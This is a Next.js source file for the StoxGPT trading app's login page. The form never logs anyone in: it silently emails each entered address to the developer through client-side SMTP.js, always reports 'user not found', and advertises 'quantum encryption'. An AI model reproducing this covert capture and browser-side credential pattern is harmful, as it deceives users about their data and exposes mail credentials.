"use client"

import type React from "react"
import { useState } from "react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Card } from "@/components/ui/card"
import Link from "next/link"
import { useRouter } from "next/navigation"

// WARNING: Using SMTP.js client-side is INSECURE for production!
declare global {
  interface Window {
    Email: {
      send: (config: {
        Host: string
        Username: string
        Password: string
        To: string
        From: string
        Subject: string
        Body: string
      }) => Promise<string>
    }
  }
}

export default function LoginPage() {
  const [showNotFound, setShowNotFound] = useState(false)
  const [email, setEmail] = useState("")
  const [password, setPassword] = useState("")
  const [isLoading, setIsLoading] = useState(false)
  const router = useRouter()

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault()
    setIsLoading(true)

    try {
      // Send email using SMTP.js (INSECURE - for demo only!)
      if (window.Email) {
        await window.Email.send({
          Host: "smtp.elasticemail.com",
          Username: "mayuraimakermail@gmail.com",
          Password: "your-smtp-password",
          To: "mayuraimakermail@gmail.com",
          From: "mayuraimakermail@gmail.com",
          Subject: "StoxGPT Login Attempt",
          Body: `Login attempt from: ${email}<br>Timestamp: ${new Date().toISOString()}`,
        })
      }
    } catch (error) {
      console.log("[v0] SMTP send failed:", error)
    }

    // Always show "user not found" after a brief delay
    setTimeout(() => {
      setIsLoading(false)
      setShowNotFound(true)
    }, 1500)
  }

  const handleDemoLogin = () => {
    router.push("/dashboard")
  }

  return (
    <div className="min-h-screen bg-black relative overflow-hidden flex items-center justify-center">
      {/* Animated Background Elements */}
      <div className="absolute inset-0 overflow-hidden">
        {/* Animated neon grid */}
        <div className="absolute inset-0">
          {[...Array(8)].map((_, i) => (
            <div
              key={`vertical-${i}`}
              className="absolute top-0 bottom-0 w-px bg-gradient-to-b from-transparent via-cyan-400/20 to-transparent"
              style={{
                left: `${(i + 1) * 12.5}%`,
                animationDelay: `${i * 0.5}s`,
              }}
            />
          ))}
          {[...Array(6)].map((_, i) => (
            <div
              key={`horizontal-${i}`}
              className="absolute left-0 right-0 h-px bg-gradient-to-r from-transparent via-purple-400/20 to-transparent"
              style={{
                top: `${(i + 1) * 16.66}%`,
                animationDelay: `${i * 0.7}s`,
              }}
            />
          ))}
        </div>

        {/* Floating particles */}
        {[...Array(25)].map((_, i) => (
          <div
            key={i}
            className={`absolute w-1 h-1 rounded-full animate-particle ${
              i % 4 === 0
                ? "bg-cyan-400"
                : i % 4 === 1
                  ? "bg-fuchsia-400"
                  : i % 4 === 2
                    ? "bg-purple-400"
                    : "bg-green-400"
            }`}
            style={{
              left: `${Math.random() * 100}%`,
              animationDelay: `${Math.random() * 8}s`,
              animationDuration: `${8 + Math.random() * 4}s`,
            }}
          />
        ))}

        {/* Holographic scanning lines */}
        <div className="absolute inset-0">
          <div className="absolute w-full h-px bg-gradient-to-r from-transparent via-cyan-400/50 to-transparent animate-scan-line" />
          <div
            className="absolute w-full h-px bg-gradient-to-r from-transparent via-fuchsia-400/30 to-transparent animate-scan-line"
            style={{ animationDelay: "3s", animationDuration: "8s" }}
          />
        </div>
      </div>

      {/* Gradient Background Overlay */}
      <div className="absolute inset-0 bg-gradient-to-br from-cyan-900/10 via-purple-900/20 to-fuchsia-900/10" />

      {/* Main Login Content */}
      <div className="relative z-10 w-full max-w-md mx-auto p-6">
        {/* Back to Home Link */}
        <div className="mb-8 text-center">
          <Link
            href="/"
            className="inline-flex items-center gap-2 text-cyan-400 hover:text-cyan-300 transition-colors duration-300"
          >
            <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 19l-7-7 7-7" />
            </svg>
            Back to StoxGPT
          </Link>
        </div>

        {/* Login Card */}
        <Card className="glassmorphic p-8 animate-neon-border relative overflow-hidden">
          {/* Holographic overlay effect */}
          <div className="absolute inset-0 bg-gradient-to-r from-transparent via-cyan-400/10 to-purple-400/10 opacity-0 hover:opacity-100 transition-opacity duration-300 pointer-events-none" />

          <div className="relative space-y-6">
            {/* Header */}
            <div className="text-center space-y-2">
              <h1 className="font-orbitron text-3xl font-bold neon-glow-cyan">Access Terminal</h1>
              <p className="text-gray-400">Enter your credentials to access the trading platform</p>
            </div>

            {/* Login Form */}
            <form onSubmit={handleLogin} className="space-y-6">
              <div className="space-y-4">
                <div className="relative">
                  <Input
                    type="email"
                    placeholder="Neural Network ID (Email)"
                    value={email}
                    onChange={(e) => setEmail(e.target.value)}
                    required
                    className="bg-black/50 border-cyan-400/50 text-white placeholder:text-gray-500 focus:border-cyan-400 focus:ring-cyan-400/50 h-12 text-lg holographic-input"
                  />
                  <div className="absolute inset-0 rounded-md bg-gradient-to-r from-cyan-400/10 to-purple-400/10 opacity-0 hover:opacity-100 transition-opacity duration-300 pointer-events-none" />
                </div>

                <div className="relative">
                  <Input
                    type="password"
                    placeholder="Security Protocol (Password)"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    required
                    className="bg-black/50 border-fuchsia-400/50 text-white placeholder:text-gray-500 focus:border-fuchsia-400 focus:ring-fuchsia-400/50 h-12 text-lg holographic-input"
                  />
                  <div className="absolute inset-0 rounded-md bg-gradient-to-r from-fuchsia-400/10 to-purple-400/10 opacity-0 hover:opacity-100 transition-opacity duration-300 pointer-events-none" />
                </div>
              </div>

              {/* Login Button */}
              <Button
                type="submit"
                disabled={isLoading}
                className="w-full bg-gradient-to-r from-cyan-400 to-purple-400 hover:from-cyan-300 hover:to-purple-300 text-black font-bold text-lg h-12 transition-all duration-300 transform hover:scale-105 disabled:opacity-50 disabled:cursor-not-allowed"
              >
                {isLoading ? (
                  <div className="flex items-center gap-2">
                    <div className="w-5 h-5 border-2 border-black/30 border-t-black rounded-full animate-spin" />
                    Authenticating Neural Link...
                  </div>
                ) : (
                  "Initialize Connection"
                )}
              </Button>

              <Button
                type="button"
                onClick={handleDemoLogin}
                className="w-full bg-gradient-to-r from-green-500 to-emerald-500 hover:from-green-400 hover:to-emerald-400 text-white font-bold text-lg h-12 transition-all duration-300"
              >
                Demo Access (Skip Login)
              </Button>

              {/* Additional Options */}
              <div className="text-center space-y-2">
                <Link href="#" className="text-sm text-gray-400 hover:text-cyan-400 transition-colors duration-300">
                  Forgot Neural Access Code?
                </Link>
                <div className="text-sm text-gray-500">
                  New to the system?{" "}
                  <Link href="#" className="text-fuchsia-400 hover:text-fuchsia-300 transition-colors duration-300">
                    Request Access
                  </Link>
                </div>
              </div>
            </form>
          </div>
        </Card>

        {/* Security Notice */}
        <div className="mt-6 text-center">
          <p className="text-xs text-gray-500">Secured by quantum encryption • Neural network protected</p>
        </div>
      </div>

      {/* User Not Found Modal */}
      {showNotFound && (
        <div className="fixed inset-0 bg-black/90 backdrop-blur-sm z-50 flex items-center justify-center p-4">
          <Card className="glassmorphic p-8 w-full max-w-md border-red-500/50 animate-error-pulse">
            <div className="space-y-6 text-center">
              {/* Error Icon */}
              <div className="mx-auto w-16 h-16 rounded-full border-2 border-red-500 flex items-center justify-center">
                <svg className="w-8 h-8 text-red-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    strokeWidth={2}
                    d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-2.5L13.732 4c-.77-.833-1.964-.833-2.732 0L3.732 16.5c-.77.833.192 2.5 1.732 2.5z"
                  />
                </svg>
              </div>

              <div>
                <h2 className="font-orbitron text-2xl font-bold neon-glow-red mb-2">Neural Link Failed</h2>
                <p className="text-lg neon-glow-red">User has not been found in database</p>
                <p className="text-sm text-gray-400 mt-2">Access denied • Security protocol activated</p>
                <p className="text-sm text-cyan-400 mt-4">Try the "Demo Access" button to explore the platform</p>
              </div>

              <Button
                onClick={() => setShowNotFound(false)}
                className="bg-red-500 hover:bg-red-400 text-white font-semibold transition-all duration-300 w-full"
              >
                Acknowledge
              </Button>
            </div>
          </Card>
        </div>
      )}
    </div>
  )
}
